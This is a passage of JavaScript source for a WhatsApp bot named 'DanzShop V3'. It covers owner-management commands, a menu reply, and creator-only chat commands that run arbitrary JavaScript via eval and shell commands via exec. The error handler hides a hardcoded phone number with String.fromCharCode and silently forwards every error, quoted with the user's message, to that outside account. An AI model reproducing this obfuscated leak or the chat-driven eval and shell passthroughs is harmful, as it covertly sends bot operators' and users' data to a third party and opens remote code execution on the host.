if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await danz.downloadAndSaveMediaMessage(qmess, "./image/dnzMg.jpg", false)
await m.reply("Berhasil mengganti image menu ✅")
}
break

//================================================================================

case "setimgfake": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await danz.downloadAndSaveMediaMessage(qmess, "./image/freya.jpg", false)
await m.reply("Berhasil mengganti image fake ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
danz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
danz.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
let menu = ` 
Haii ${m.pushName},
Perkenalkan, saya adalah *DanzShop V3*. klik tombol menu di bawah ini untuk mengetahui berbagai fitur yang dapat saya lakukan.
`
let buttons = [
  {
    buttonId: ".menu2", 
    buttonText: { 
      displayText: "Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            },
                externalAdReply: {
      title: `${botname} - ${versi}`,
      body: ``,
      thumbnailUrl: global.imgfake,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
danz.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});